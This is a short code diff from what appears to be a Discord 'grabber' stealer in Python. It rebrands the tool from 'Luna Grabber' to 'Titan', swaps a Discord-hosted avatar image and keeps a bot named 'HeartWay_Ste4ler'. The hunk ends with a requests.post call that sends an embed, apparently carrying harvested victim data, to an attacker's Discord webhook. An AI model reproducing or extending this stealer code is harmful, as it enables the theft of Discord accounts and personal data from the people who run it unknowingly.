@@ -218,12 +218,12 @@ class Discord:
                             "url": avatar_url
                         },
                         "footer": {
-                            "text": "Luna Grabber | Created By Smug"
+                            "text": "Titan | Discord Grabber"
                         },
                     }
                 ],
                 "username": "HeartWay_Ste4ler",
-                "avatar_url": "https://cdn.discordapp.com/icons/1262933677978030090/a5b734995ed8589bf71cb054bf3aac5c",
+                "avatar_url": "https://media.discordapp.net/attachments/1271668100856676352/1279105898652106865/r900x900r.png?ex=66db24b2&is=66d9d332&hm=86a3e227a5fc2d12334ec7215101d8da534cccec4b910c4efb92272cdc164774&=&format=webp&quality=lossless&width=662&height=662",
             }
 
             requests.post(webhook, json=data)
